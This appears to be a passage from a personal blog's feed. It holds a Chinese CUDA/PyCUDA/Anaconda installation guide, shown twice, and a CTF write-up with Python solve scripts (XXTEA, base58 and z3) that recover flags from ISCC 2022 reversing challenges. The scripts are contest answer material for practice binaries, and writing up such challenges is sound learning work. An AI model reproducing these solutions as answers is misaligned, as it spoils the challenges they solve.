href="https://www.microsoft.com/en-us/download/details.aspx?id=48145">https://www.microsoft.com/en-us/download/details.aspx?id=48145</a></p><h3 id="CUDA-Toolkit和CUDNN"><a href="#CUDA-Toolkit和CUDNN" class="headerlink" title="CUDA Toolkit和CUDNN"></a>CUDA Toolkit和CUDNN</h3><p>CUDNN  <a href="https://developer.nvidia.com/cudnn">https://developer.nvidia.com/cudnn</a><br>先下载好，后面会用到<br>CUDA Toolkit <a href="https://developer.nvidia.com/cuda-downloads">https://developer.nvidia.com/cuda-downloads</a><br>注意下载的版本，笔者使用的是v10.2<br>组件按需要选择，我用这四个就可以了。</p><p><img src="https://i.loli.net/2020/11/20/Fd1XP7TGVSUz3uC.png"></p><p>CUDA会自动配置一些环境变量，还有一些需要手动配置。<br>环境变量中添加：</p><pre><code>CUDA_LIB_PATH = %CUDA_PATH%\lib\x64 CUDA_BIN_PATH = %CUDA_PATH%\bin CUDA_SDK_BIN_PATH = %CUDA_SDK_PATH%\bin\win64 CUDA_SDK_LIB_PATH = %CUDA_SDK_PATH%\common\lib\x64 </code></pre><p>Path中添加：</p><pre><code>C:\Program Files\NVIDIA Corporation\NVSMIC:\Program Files\NVIDIA Corporation\NVIDIA NvDLISRC:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\libC:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\includeC:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\binC:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\libnvvp</code></pre><p>当然，需要添加的路径取决于安装的组件和安装目录，别直接复制。</p><p>将CUDNN下的bin include lib三个文件夹添加到<br>C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2下面的bin include lib中，<br>实际上只是将CUDNN的三个文件添加到目录下。</p><p><img src="https://i.loli.net/2020/11/20/G53LzqejyfpIlH7.png"></p><h2 id="验证与报错解决"><a href="#验证与报错解决" class="headerlink" title="验证与报错解决"></a>验证与报错解决</h2><p>是的，本文的主要内容是解决一些神奇的报错和环境问题。<br>毕竟笔者两周的自闭时光不能毫无产出啊。</p><h3 id="nvcc-V"><a href="#nvcc-V" class="headerlink" title="nvcc -V"></a>nvcc -V</h3><p>这只是最基本的检查，有结果也不能说明安装成功，出错可能还更麻烦。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171530478.png"></p><h3 id="bandwidthTest-exe和deviceQuery-exe"><a href="#bandwidthTest-exe和deviceQuery-exe" class="headerlink" title="bandwidthTest.exe和deviceQuery.exe"></a>bandwidthTest.exe和deviceQuery.exe</h3><p>以上两个程序在目录C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\extras\demo_suite中。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171531934.png"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171531935.png"></p><p>如果遇到报错，有return Error <strong>35</strong>，driver <strong>insuffcient</strong>之类字样的报错信息，那可能是驱动版本太低了，需要更新显卡驱动到最新。</p><h3 id="Anaconda"><a href="#Anaconda" class="headerlink" title="Anaconda"></a>Anaconda</h3><p>也许你又和我一样，在用anaconda安装pycuda时就看到这样的提示。<br>虽然conda install pycuda没有成功，但是pip install pycuda解决，仿佛问题不大。<br>然而，这个却是笔者环境问题的关键。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171531292.png"></p><p>[superuser.com][10]上的回答没有参考价值，并不是双引号的原因。<br>笔者<strong>猜测</strong>可能是anaconda在解析Path环境变量时会每读一行就添加一个分号来分隔一行环境变量值。<br>要是你像我一样行末本来就有分号就麻烦了，需要删除每一行行末的分号。<br>笔者甚至把Path中的每一个路径单独作一行才解决这个问题。<br>如果解决，进入anaconda prompt时没有错误提示。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171532764.png"></p><h3 id="cl-exe"><a href="#cl-exe" class="headerlink" title="cl.exe"></a>cl.exe</h3><p>这时候可以尝试跑一条测试代码看看有没有成功使用到GPU。<br>遗憾的是<strong>又一次</strong>报错了，关于cl.exe，泪儿流下来。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171532297.png"></p><p>这时候去 C:\Program Files (x86)\Microsoft Visual Studio v14.0\VC\bin\amd64，这里有一个cl.exe，把路径添加到Path中。<br>(注意要选amd64，它隔壁目录也有cl.exe，不要认为都可以)<br>在把 C:\Program Files (x86)\Microsoft Visual Studio v14.0\VC\bin也加进Path去。</p><h3 id="corecrt-h和stddef-h缺失"><a href="#corecrt-h和stddef-h缺失" class="headerlink" title="corecrt.h和stddef.h缺失"></a>corecrt.h和stddef.h缺失</h3><p>再一次运行，又报错了，运行时提示No such file or directy。<br>添加C:\Program Files (x86)\Windows Kits\10\Include\10.0.10240.0\ucrt到Path中，可以先检查一下这个目录下有没有这两个文件。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>再一次感谢Jing老师的指导和LCX提供的安装文档，并且在这两周一直帮我想办法。</p><p>同时，本文的目录仅供参考，读者还是要以自己的安装目录为准。</p><p>如果玄学问题不断，而且又把安装目录指定为机械盘，可能是硬盘的错误需要重装。（虽然可能性极小）</p><p>环境的玄学问题还是要及时请教有经验的人士，避免自己无脑重装软件却丝毫没有触及核心问题。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;整理之前的笔记&lt;/p&gt;</summary>
    
    
    
    
    <category term="配置" scheme="http://slient2009.github.io/tags/%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>今晚，我安装好了CUDA+PyCUDA+Anaconda</title>
    <link href="http://slient2009.github.io/2022/12/18/InstallCUDA/"/>
    <id>http://slient2009.github.io/2022/12/18/InstallCUDA/</id>
    <published>2022-12-18T05:00:01.000Z</published>
    <updated>2022-12-17T07:36:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>整理之前的笔记</p><span id="more"></span><p><img src="https://i.loli.net/2020/11/20/IBMFVHb81kUNY9j.jpg" alt="11"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>未来一段时间要用python在GPU上写一些代码，需要安装python+CUDA。<br>但是却在环境问题上耽误了大概两周的样子，修了又修，接近自闭。<br>今晚终于在Jing老师和LCX的帮助下解决了。<br>怎么想都想不到竟然是分号的问题？！<br>本文安装步骤来自LCX的安装文档，再加上Jing老师的指导，笔者主要是在记录详细过程。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Anaconda-python"><a href="#Anaconda-python" class="headerlink" title="Anaconda-python"></a>Anaconda-python</h3><p>预先安装的python就不要了，用anaconda提供的python。<br>anaconda会提供一些常用的工具包，在它下面运行python会比较方便(LCX语)。<br>从官网下载安装包默认安装即可，建议在安装时将它添加到环境变量中方便使用。</p><p><img src="https://i.loli.net/2020/11/20/PtvUm5qdyRW4gO3.png" alt="22"></p><p>然后在anaconda prompt中安装pycuda<br>conda install pycuda 或者 pip install pycuda</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171526277.png"></p><h3 id="Visual-Studio"><a href="#Visual-Studio" class="headerlink" title="Visual Studio"></a>Visual Studio</h3><p>不必用VS编写代码，这里用的是它的VC++的一些发行版本。<br>笔者在头铁尝试VS2017碰壁后灰溜溜回到VS2015。<br>虽然没有直接证据证明VS2017不行，但综合网上文章和朋友的经验，还是VS2015稳一点。<br>当然，有可能会用到VC2015的一个修复版本来解决文件缺失的问题。<br><a href="https://www.microsoft.com/en-us/download/details.aspx?id=48145">https://www.microsoft.com/en-us/download/details.aspx?id=48145</a></p><h3 id="CUDA-Toolkit和CUDNN"><a href="#CUDA-Toolkit和CUDNN" class="headerlink" title="CUDA Toolkit和CUDNN"></a>CUDA Toolkit和CUDNN</h3><p>CUDNN  <a href="https://developer.nvidia.com/cudnn">https://developer.nvidia.com/cudnn</a><br>先下载好，后面会用到<br>CUDA Toolkit <a href="https://developer.nvidia.com/cuda-downloads">https://developer.nvidia.com/cuda-downloads</a><br>注意下载的版本，笔者使用的是v10.2<br>组件按需要选择，我用这四个就可以了。</p><p><img src="https://i.loli.net/2020/11/20/Fd1XP7TGVSUz3uC.png"></p><p>CUDA会自动配置一些环境变量，还有一些需要手动配置。<br>环境变量中添加：</p><pre><code>CUDA_LIB_PATH = %CUDA_PATH%\lib\x64 CUDA_BIN_PATH = %CUDA_PATH%\bin CUDA_SDK_BIN_PATH = %CUDA_SDK_PATH%\bin\win64 CUDA_SDK_LIB_PATH = %CUDA_SDK_PATH%\common\lib\x64 </code></pre><p>Path中添加：</p><pre><code>C:\Program Files\NVIDIA Corporation\NVSMIC:\Program Files\NVIDIA Corporation\NVIDIA NvDLISRC:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\libC:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\includeC:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\binC:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\libnvvp</code></pre><p>当然，需要添加的路径取决于安装的组件和安装目录，别直接复制。</p><p>将CUDNN下的bin include lib三个文件夹添加到<br>C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2下面的bin include lib中，<br>实际上只是将CUDNN的三个文件添加到目录下。</p><p><img src="https://i.loli.net/2020/11/20/G53LzqejyfpIlH7.png"></p><h2 id="验证与报错解决"><a href="#验证与报错解决" class="headerlink" title="验证与报错解决"></a>验证与报错解决</h2><p>是的，本文的主要内容是解决一些神奇的报错和环境问题。<br>毕竟笔者两周的自闭时光不能毫无产出啊。</p><h3 id="nvcc-V"><a href="#nvcc-V" class="headerlink" title="nvcc -V"></a>nvcc -V</h3><p>这只是最基本的检查，有结果也不能说明安装成功，出错可能还更麻烦。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171530478.png"></p><h3 id="bandwidthTest-exe和deviceQuery-exe"><a href="#bandwidthTest-exe和deviceQuery-exe" class="headerlink" title="bandwidthTest.exe和deviceQuery.exe"></a>bandwidthTest.exe和deviceQuery.exe</h3><p>以上两个程序在目录C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\extras\demo_suite中。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171531934.png"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171531935.png"></p><p>如果遇到报错，有return Error <strong>35</strong>，driver <strong>insuffcient</strong>之类字样的报错信息，那可能是驱动版本太低了，需要更新显卡驱动到最新。</p><h3 id="Anaconda"><a href="#Anaconda" class="headerlink" title="Anaconda"></a>Anaconda</h3><p>也许你又和我一样，在用anaconda安装pycuda时就看到这样的提示。<br>虽然conda install pycuda没有成功，但是pip install pycuda解决，仿佛问题不大。<br>然而，这个却是笔者环境问题的关键。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171531292.png"></p><p>[superuser.com][10]上的回答没有参考价值，并不是双引号的原因。<br>笔者<strong>猜测</strong>可能是anaconda在解析Path环境变量时会每读一行就添加一个分号来分隔一行环境变量值。<br>要是你像我一样行末本来就有分号就麻烦了，需要删除每一行行末的分号。<br>笔者甚至把Path中的每一个路径单独作一行才解决这个问题。<br>如果解决，进入anaconda prompt时没有错误提示。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171532764.png"></p><h3 id="cl-exe"><a href="#cl-exe" class="headerlink" title="cl.exe"></a>cl.exe</h3><p>这时候可以尝试跑一条测试代码看看有没有成功使用到GPU。<br>遗憾的是<strong>又一次</strong>报错了，关于cl.exe，泪儿流下来。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171532297.png"></p><p>这时候去 C:\Program Files (x86)\Microsoft Visual Studio v14.0\VC\bin\amd64，这里有一个cl.exe，把路径添加到Path中。<br>(注意要选amd64，它隔壁目录也有cl.exe，不要认为都可以)<br>在把 C:\Program Files (x86)\Microsoft Visual Studio v14.0\VC\bin也加进Path去。</p><h3 id="corecrt-h和stddef-h缺失"><a href="#corecrt-h和stddef-h缺失" class="headerlink" title="corecrt.h和stddef.h缺失"></a>corecrt.h和stddef.h缺失</h3><p>再一次运行，又报错了，运行时提示No such file or directy。<br>添加C:\Program Files (x86)\Windows Kits\10\Include\10.0.10240.0\ucrt到Path中，可以先检查一下这个目录下有没有这两个文件。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>再一次感谢Jing老师的指导和LCX提供的安装文档，并且在这两周一直帮我想办法。</p><p>同时，本文的目录仅供参考，读者还是要以自己的安装目录为准。</p><p>如果玄学问题不断，而且又把安装目录指定为机械盘，可能是硬盘的错误需要重装。（虽然可能性极小）</p><p>环境的玄学问题还是要及时请教有经验的人士，避免自己无脑重装软件却丝毫没有触及核心问题。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;整理之前的笔记&lt;/p&gt;</summary>
    
    
    
    
    <category term="配置" scheme="http://slient2009.github.io/tags/%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>ISCC CTF Android</title>
    <link href="http://slient2009.github.io/2022/05/04/ISCC-Android/"/>
    <id>http://slient2009.github.io/2022/05/04/ISCC-Android/</id>
    <published>2022-05-04T04:00:01.000Z</published>
    <updated>2022-06-14T03:45:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>北京理工大学信息系统及安全对抗实验中心 2022年第19届信息安全与对抗技术竞赛 部分逆向题</p><span id="more"></span><h1 id="Amy’s-Code"><a href="#Amy’s-Code" class="headerlink" title="Amy’s Code"></a>Amy’s Code</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">aim = [<span class="number">149</span>,<span class="number">169</span>,<span class="number">137</span>,<span class="number">134</span>,<span class="number">212</span>,<span class="number">188</span>,<span class="number">177</span>,<span class="number">184</span>,<span class="number">177</span>,<span class="number">197</span>, <span class="number">192</span>, <span class="number">179</span>, <span class="number">153</span>, <span class="number">124</span>, <span class="number">185</span>, <span class="number">129</span>, <span class="number">159</span>, <span class="number">196</span>, <span class="number">142</span>, <span class="number">184</span>]</span><br><span class="line">adv = <span class="built_in">list</span>(<span class="string">&quot;LWHFUENGDJGEFHYDHIGJ&quot;</span>)</span><br><span class="line">flag = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    flag[ind] = aim[ind] - <span class="built_in">ord</span>(adv[ind])</span><br><span class="line">    flag[ind] = flag[ind] ^ ind</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">chr</span>(x), flag)))</span><br></pre></td></tr></table></figure><h1 id="How-decode"><a href="#How-decode" class="headerlink" title="How_decode"></a>How_decode</h1><p>xxtea加密，可以用这个<a href="https://github.com/polymorf/findcrypt-yara">findcrypt</a>工具来分辨常见的加密算法。</p><p>本来是比较简单的，可是我自己想尝试使用python实现一遍xxtea算法，因为不太熟悉算法废了些时间，主要是处理一些运算细节。</p><p>其实也有现成的C的<a href="https://qianfei11.github.io/2019/08/22/Python%E5%AE%9E%E7%8E%B0TEA%E3%80%81XTEA%E3%80%81XXTEA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/">轮子</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int32</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; ( (<span class="number">1</span>&lt;&lt;<span class="number">32</span>)-<span class="number">1</span> ) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u2i</span>(<span class="params">x</span>):</span></span><br><span class="line">    x = int32(x)</span><br><span class="line">    maxint = (<span class="number">1</span>&lt;&lt;<span class="number">31</span>) -<span class="number">1</span>  </span><br><span class="line">    <span class="keyword">if</span> x &gt; maxint:</span><br><span class="line">        x = -maxint - <span class="number">2</span> + (x - maxint)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">i2u</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(x &gt;=<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    maxint = (<span class="number">1</span>&lt;&lt;<span class="number">31</span>) -<span class="number">1</span>  </span><br><span class="line">    <span class="keyword">return</span> maxint + (<span class="number">1</span>&lt;&lt;<span class="number">31</span>) + x +<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xxtea_encode</span>(<span class="params">plain, key, delta</span>):</span></span><br><span class="line">    Len = <span class="built_in">len</span>(plain)</span><br><span class="line">    rounds = <span class="number">52</span> // Len + <span class="number">6</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">        plain[ind] = u2i(plain[ind])</span><br><span class="line">    rnd_key = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(rounds &gt; <span class="number">0</span>):</span><br><span class="line">        rnd_key = rnd_key - delta</span><br><span class="line">        e = rnd_key &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, Len):</span><br><span class="line">            lst_chr = plain[(ind-<span class="number">1</span>) % Len]</span><br><span class="line">            cipher_ind_nxt = plain[(ind + <span class="number">1</span>) % Len]</span><br><span class="line">            adv = ( ( ((cipher_ind_nxt&lt;&lt;<span class="number">2</span>)^(lst_chr&gt;&gt;<span class="number">5</span>)) + ((cipher_ind_nxt&gt;&gt;<span class="number">3</span>)^(lst_chr&lt;&lt;<span class="number">4</span>)) ) ^ ( (cipher_ind_nxt^rnd_key) + (lst_chr ^ key[e ^ ind &amp; <span class="number">3</span>]) ) )</span><br><span class="line">            plain[ind] = u2i(plain[ind] + adv)</span><br><span class="line">        rounds -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xxtea_decode</span>(<span class="params">cipher, key, delta</span>):</span></span><br><span class="line">    Len = <span class="built_in">len</span>(cipher)</span><br><span class="line">    rounds = <span class="number">52</span> // Len + <span class="number">6</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        cipher[ind] = u2i(cipher[ind])</span><br><span class="line"></span><br><span class="line">    rnd_key = <span class="number">0</span></span><br><span class="line">    rev_rnd_keys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        rnd_key -= delta</span><br><span class="line">        rnd_key = int32(rnd_key)</span><br><span class="line">        rev_rnd_keys.append(rnd_key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(rounds &gt; <span class="number">0</span>):</span><br><span class="line">        rnd_key = rev_rnd_keys[rounds-<span class="number">1</span>]</span><br><span class="line">        e = rnd_key &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        lst_chr = cipher[Len - <span class="number">1</span> - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(Len - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            lst_chr = cipher[(ind-<span class="number">1</span>) % Len]</span><br><span class="line">            cipher_ind_nxt = cipher[(ind + <span class="number">1</span>) % Len]</span><br><span class="line">            adv = ( ( ((cipher_ind_nxt&lt;&lt;<span class="number">2</span>)^(lst_chr&gt;&gt;<span class="number">5</span>)) + ((cipher_ind_nxt&gt;&gt;<span class="number">3</span>)^(lst_chr&lt;&lt;<span class="number">4</span>)) ) ^ ( (cipher_ind_nxt^rnd_key) + (lst_chr ^ key[e ^ ind &amp; <span class="number">3</span>]) ) )</span><br><span class="line">            cipher[ind] = u2i(cipher[ind] - adv)</span><br><span class="line">        rounds -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line">p = [<span class="number">0x49</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x43</span>, <span class="number">0x7b</span>, <span class="number">0x48</span>, <span class="number">0x51</span>, <span class="number">0x68</span>, <span class="number">0x4b</span>, <span class="number">0x45</span>, <span class="number">0x39</span>, <span class="number">0x55</span>, <span class="number">0x6f</span>, <span class="number">0x50</span>, <span class="number">0x57</span>, <span class="number">0x66</span>, <span class="number">0x71</span>, <span class="number">0x7d</span>]</span><br><span class="line">c = [<span class="number">0xE891B209</span>,<span class="number">0x7CE53269</span>,<span class="number">0x5DD21C21</span>,<span class="number">0x7C10247C</span>,<span class="number">0x6599594B</span>,<span class="number">0x32781574</span>,<span class="number">0xE603D667</span>,<span class="number">0x1D26D9D6</span>,<span class="number">0x272CC7E6</span>,<span class="number">0x15AEA474</span>,<span class="number">0xCA4C71B9</span>,<span class="number">0x3379CCA</span>,<span class="number">0x9A77F1D5</span>,<span class="number">0x7B643B55</span>,<span class="number">0x7F6A71F8</span>,<span class="number">0x3CB1D0C4</span>,<span class="number">0x6BFA1C52</span>,<span class="number">0xCAD81CB3</span>]</span><br><span class="line">k = [<span class="number">73</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>]</span><br><span class="line">d = <span class="number">0x61C88647</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ci = xxtea_encode(p, k, d)</span></span><br><span class="line">pi = xxtea_decode(c, k, d)</span><br></pre></td></tr></table></figure><h1 id="GetTheTable"><a href="#GetTheTable" class="headerlink" title="GetTheTable"></a>GetTheTable</h1><p>老实说没有分析出来加密过程，可能是IDA反编译有点儿问题，伪代码的逻辑和base58的算法有点儿区别。<br>不过既然都看到base58算法了不妨直接试一下，发现这里直接按照base58的逻辑写脚本就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">strr = <span class="string">&quot;ERaQux2mPMMXfoiML7guVUsB3a&quot;</span></span><br><span class="line">alphaTb = <span class="string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line">enc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strr:</span><br><span class="line">    enc.append(alphaTb.index(i))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="built_in">sum</span> = <span class="built_in">sum</span>*<span class="number">58</span> + i</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">sum</span> &gt; <span class="number">0</span>):</span><br><span class="line">    res = <span class="built_in">sum</span> % <span class="number">256</span></span><br><span class="line">    <span class="built_in">sum</span> = <span class="built_in">sum</span> // <span class="number">256</span></span><br><span class="line">    flag.append(<span class="built_in">chr</span>(res))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(flag[ind], end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="Sad-Code"><a href="#Sad-Code" class="headerlink" title="Sad_Code"></a>Sad_Code</h1><p>数学公式选用z3求解，动态跟一下就能得到大致的逻辑，总之就是做了些简单的char int ascii之间的变换。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">int64x8_m1 = Int(<span class="string">&#x27;int64x8_m1&#x27;</span>)</span><br><span class="line">int64x8_0_ = Int(<span class="string">&#x27;int64x8_0_&#x27;</span>)</span><br><span class="line">int64x8_1_ = Int(<span class="string">&#x27;int64x8_1_&#x27;</span>)</span><br><span class="line">int64x8_2_ = Int(<span class="string">&#x27;int64x8_2_&#x27;</span>)</span><br><span class="line">int64x8_3_ = Int(<span class="string">&#x27;int64x8_3_&#x27;</span>)</span><br><span class="line">int64x8_4_ = Int(<span class="string">&#x27;int64x8_4_&#x27;</span>)</span><br><span class="line">int64x8_5_ = Int(<span class="string">&#x27;int64x8_5_&#x27;</span>)</span><br><span class="line">int64x8_6_ = Int(<span class="string">&#x27;int64x8_6_&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add( int64x8_1_ + <span class="number">7</span> * int64x8_0_ - <span class="number">4</span> * int64x8_m1 - <span class="number">2</span> * int64x8_2_ == <span class="number">0x1EA758B03</span>  )</span><br><span class="line">s.add( <span class="number">5</span> * int64x8_2_ + <span class="number">3</span> * int64x8_1_ - int64x8_0_ - <span class="number">2</span> * int64x8_m1 == <span class="number">0x129F7B49D</span>  )</span><br><span class="line">s.add( <span class="number">2</span> * int64x8_0_ + <span class="number">8</span> * int64x8_2_ + <span class="number">10</span> * int64x8_m1 - <span class="number">5</span> * int64x8_1_ == <span class="number">0x4CC880F25</span>  )</span><br><span class="line">s.add( <span class="number">7</span> * int64x8_m1 + <span class="number">15</span> * int64x8_0_ - <span class="number">3</span> * int64x8_2_ - <span class="number">2</span> * int64x8_1_ == <span class="number">0x7D7E95653</span>   )</span><br><span class="line">s.add( <span class="number">15</span> * int64x8_3_ + <span class="number">35</span> * int64x8_6_ - int64x8_4_ - int64x8_5_ == <span class="number">0xFF2E49303</span>  )</span><br><span class="line">s.add( <span class="number">38</span> * int64x8_5_ + int64x8_3_ + int64x8_6_ - <span class="number">24</span> * int64x8_4_ == <span class="number">0x6C07DC086</span>  )</span><br><span class="line">s.add( <span class="number">38</span> * int64x8_4_ + <span class="number">32</span> * int64x8_3_ - int64x8_5_ - int64x8_6_ == <span class="number">0x14FD9518AB</span>  )</span><br><span class="line">s.add( int64x8_3_ + <span class="number">41</span> * int64x8_5_ - int64x8_4_ - <span class="number">25</span> * 